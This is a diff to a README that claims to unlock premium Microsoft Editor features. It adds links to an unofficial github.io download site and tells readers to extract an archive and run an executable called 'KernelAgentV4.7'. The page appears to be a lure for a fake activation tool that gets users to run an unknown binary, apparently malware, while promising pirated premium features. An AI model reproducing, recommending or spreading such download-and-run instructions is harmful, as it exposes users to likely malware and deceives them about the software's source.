@@ -2,13 +2,15 @@
 
 Unlock the full potential of Microsoft Editor — the AI-powered grammar and clarity assistant embedded in Word, Outlook, and web-based Office apps. This utility ensures Editor is fully active and working with premium suggestions on supported Microsoft 365 builds.
 
-[![Download Microsoft Editor](https://img.shields.io/badge/Download-Editor_AI_Assistant-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Microsoft Editor](https://img.shields.io/badge/Download-Editor_AI_Assistant-blueviolet)](https://m365-editor-ai-writing-assistant.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-editor-ai-writing-assistant.github.io/.github
+) section  
 2. 📁 **Extract the folder** to a location like `C:\M365EditorAI`  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to activate all Editor features  
 4. ✍️ Open Word or Outlook to verify Editor is fully enabled  
